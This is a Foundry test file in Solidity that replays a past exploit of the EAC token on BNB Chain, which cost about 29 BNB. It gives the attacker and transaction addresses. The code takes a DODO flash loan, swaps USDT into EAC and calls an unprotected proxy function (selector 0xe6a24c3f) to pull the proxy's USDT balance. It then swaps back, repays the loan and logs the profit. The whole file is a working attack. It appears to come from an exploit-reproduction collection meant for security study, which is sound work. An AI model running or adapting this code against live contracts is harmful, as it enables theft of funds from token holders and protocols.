// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$29BNB
// Attacker : https://bscscan.com/address/0x27e981348c2d1f5b2227c182a9d0ed46eed84946
// Attack Contract : https://bscscan.com/address/0x20dcf125f0563417d257b98a116c3fea4f0b2db2
// Attack Tx : https://bscscan.com/tx/0x477f9ee698ac8ae800ffa012ab52fd8de39b58996245c5e39a4233c1ae5f1baa

// @Analysis
// Twitter Guy : https://twitter.com/bbbb/status/1696520866564350157

contract ContractTest is Test {
    address private constant usdt = 0x55d398326f99059fF775485246999027B3197955;
    address private constant pancakeRouterV2 = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private constant dodo_pool = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;

    address private constant proxy = 0xa08a40e0F11090Dcb09967973DF82040bFf63561;
    address private constant eac = 0x64f291DE10eCd36D5f7b64aaEbC70943CFACE28E;

    function setUp() public {
        vm.createSelectFork("bsc", 31_273_019 - 1);
        vm.label(usdt, "USDT");
        vm.label(eac, "EAC");
        vm.label(pancakeRouterV2, "PANCAKE_ROUTER_V2");
        vm.label(dodo_pool, "DODOPool");
    }

    function testExploit() public {
        IDPPOracle(dodo_pool).flashLoan(0, 300_000_000_000_000_008_388_608, address(this), new bytes(1));
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        swap(usdt, eac, IERC20(usdt).balanceOf(address(this)));
        proxy.call(abi.encodeWithSelector(0xe6a24c3f, IERC20(usdt).balanceOf(proxy)));
        swap(eac, usdt, IERC20(eac).balanceOf(address(this)));
        // pay back
        IERC20(usdt).transfer(msg.sender, 300_000_000_000_000_008_388_608);
        emit log_named_decimal_uint("Attacker USDT balance after exploit", IERC20(usdt).balanceOf(address(this)), 18);
    }

    function swap(address tokenIn, address tokenOut, uint256 amountIn) internal {
        IERC20(tokenIn).approve(pancakeRouterV2, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        IUniswapV2Router(payable(pancakeRouterV2)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, address(this), block.timestamp + 1000
        );
    }
}
